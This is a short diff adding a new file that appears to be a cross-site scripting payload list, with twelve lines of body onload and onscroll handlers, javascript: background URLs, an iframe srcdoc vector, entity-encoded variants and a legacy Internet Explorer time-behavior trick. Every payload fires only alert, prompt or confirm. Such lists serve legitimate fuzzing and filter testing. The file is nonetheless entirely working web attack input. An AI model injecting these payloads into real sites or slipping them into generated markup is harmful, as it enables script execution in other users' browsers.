@@ -1,0 +1,12 @@
+<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
+<body/onload=&lt;!--&gt;&#10alert(1)>
+<BODY BACKGROUND="javascript:alert('XSS')">
+<BODY ONLOAD=alert('XSS')>
+<BODY ONLOAD=alert('hellox worldss')>
+<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+&lt;BODY BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
+&lt;BODY ONLOAD=alert('XSS')&gt;
+&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=alert(\"XSS\")&gt;
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
+<BODY ONLOAD=alert('XSS')>
